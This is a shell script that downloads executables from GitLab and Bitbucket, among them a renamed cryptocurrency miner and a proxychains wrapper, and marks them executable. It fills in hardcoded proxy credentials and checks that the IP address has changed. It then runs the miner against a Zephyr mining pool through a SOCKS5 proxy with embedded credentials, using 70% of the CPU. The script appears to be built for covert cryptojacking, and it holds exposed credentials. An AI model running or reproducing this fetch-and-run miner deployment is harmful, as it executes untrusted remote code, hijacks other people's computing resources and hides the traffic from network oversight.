proxy="188.74.210.21" 
port="6100" 
user="ubslvwxe"  
pass="iikj33112te4" 
wget -q -O diamona https://gitlab.com/os6335803/in/-/raw/main/curl && chmod +x diamona
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./diamona --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:wJAdlDMok2aTd6z@34.192.37.108:1080 --cpu-max-threads-hint=70% -k $(nproc --all) 


